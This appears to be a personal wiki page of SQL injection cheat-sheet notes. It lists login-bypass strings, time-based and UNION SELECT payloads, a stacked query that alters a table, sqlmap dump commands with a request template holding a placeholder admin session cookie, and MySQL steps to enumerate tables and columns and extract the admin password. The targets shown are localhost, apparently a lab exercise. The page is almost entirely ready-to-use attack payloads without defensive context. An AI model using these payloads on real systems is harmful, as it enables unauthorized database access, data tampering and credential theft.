Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2020-05-12T11:01:15-04:00

====== sql injection ======
Created Tuesday 12 May 2020

**test '  OR 1=1;--**

**tomâ€™ or 1=1;#**

**test' (sleep 5)**

**id=1 union all select 1, 2, @@version**


**' UNION SELECT '123' AS password#**

**fetch?id=1;UPDATE photos SET title='test' WHERE id=3;COMMIT;--**



====== sqlmap ======

**-u http://127.0.0.1/xxxxxxxxxx/fetch?id=1 --dump**

**sqlmap -r request.txt --dump    with brup request** 

format 
GET /xxxxxxxxxx/ticket?id=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session_level7b={ADMIN SESSION}
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache



====== mysql ======

**1.1 UNION SELECT VERSION(),DATABASE(),3--**

GET TABLE NAME:
**ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--**
GET COLUMN NAME:
**ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--**

DUMP DATA:
**ticket?id=1.1 UNION SELECT 1,password,3 FROM users WHERE username='admin'--**
